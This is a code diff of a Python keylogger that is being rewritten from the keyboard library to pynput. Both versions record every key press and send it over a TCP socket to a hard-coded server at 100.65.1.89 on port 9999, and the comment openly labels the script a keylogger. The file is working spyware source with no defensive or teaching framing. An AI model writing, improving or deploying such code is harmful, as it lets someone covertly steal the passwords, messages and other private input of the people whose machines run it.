@@ -1,39 +1,40 @@
-import keyboard  # Using keyboard library instead of pynput
 import socket
-import ctypes
+from pynput.keyboard import Listener
 
+# Server Information
+server_ip = '100.65.1.89'
+server_port = 9999
+
+# Create a TCP socket
+client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+client_socket.connect((server_ip, server_port))
+
+# Keystroke Count
 keystroke_count = 0
 
-# Server address and port
-SERVER_ADDRESS = '100.65.1.89'  # Replace with the server's IP address
-SERVER_PORT = 9999  # Must match the server port
+# Function to send data to the server
+def send_data(data):
+    try:
+        client_socket.send(data.encode('utf-8'))
+    except Exception as e:
+        print(f"Error sending data: {e}")
 
-# Initialize a list for keystrokes
-keystrokes = []
-
-def send_keystrokes_to_server(data):
-    """Send keystrokes to the server."""
-    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
-        try:
-            s.connect((SERVER_ADDRESS, SERVER_PORT))
-            s.sendall(data.encode('utf-8'))
-        except Exception as e:
-            print(f"Error sending data: {e}")
-
-def on_key_event(event):
-    global keystrokes
-    if event.event_type == 'down':  # Only capture key press events
-        keystrokes.append(event.name)  # Append the key name
-        
-        # Check if we should send keystrokes to the server
-        if len(keystrokes) >= 3:
-            data_to_send = ' '.join(keystrokes)
-            send_keystrokes_to_server(data_to_send)
-            keystrokes = []  # Reset after sending
+# Callback for each key press
+def on_press(key):
+    global keystroke_count
+    keystroke_count += 1
+    
+    try:
+        # Log and send key information to the server
+        key_str = str(key).replace("'", "")
+        print(f"Key pressed: {key_str}")
+        send_data(key_str)
+    except Exception as e:
+        print(f"Error logging key: {e}")
 
 # Start the keylogger
-try:
-    keyboard.hook(on_key_event)  # Hook the key event
-    keyboard.wait('esc')  # Wait for the Esc key to exit
-except Exception as e:
-    print(f"An error occurred: {e}")
+with Listener(on_press=on_press) as listener:
+    listener.join()
+
+# Close the socket after logging
+client_socket.close()
